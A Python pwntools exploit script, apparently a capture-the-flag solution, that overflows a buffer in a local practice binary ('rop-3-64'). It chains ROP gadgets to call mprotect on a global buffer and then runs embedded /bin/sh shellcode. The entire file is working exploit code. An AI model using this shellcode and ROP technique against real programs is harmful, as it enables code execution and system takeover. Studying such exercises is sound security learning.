#!/usr/bin/env python

from pwn import *


SHELLCODE = 'jlX\x0f\x05P_P^jrX\x0f\x05j;X\x99H\xbb//bin/shRSR^T_\x0f\x05'

p = process("./rop-3-64")

addr_mprotect = p.elf.symbols['mprotect']

g_buf = 0x601080

aligned_g_buf = g_buf & 0xfffff000

#0x0000000000400743 : pop rdi ; ret
#0x000000000040064a : pop rdx ; nop ; pop rbp ; ret
#0x0000000000400741 : pop rsi ; pop r15 ; ret

rdi_ret = 0x400743
rdx_rbp_ret = 0x40064a
rsi_r15_ret = 0x400741


payload = SHELLCODE + "A" * (0x80 + 8 - len(SHELLCODE))

# call mprotect(aligned_g_buf, 0x1000, 7)
# then call g_buf

payload +=  p64(rdi_ret) + p64(aligned_g_buf) + \
            p64(rsi_r15_ret) + p64(0x1000) + p64(0x1000) + \
            p64(rdx_rbp_ret) + p64(7) + p64(7) + \
            p64(addr_mprotect) + \
            p64(g_buf)

p.sendline(payload)

p.interactive()
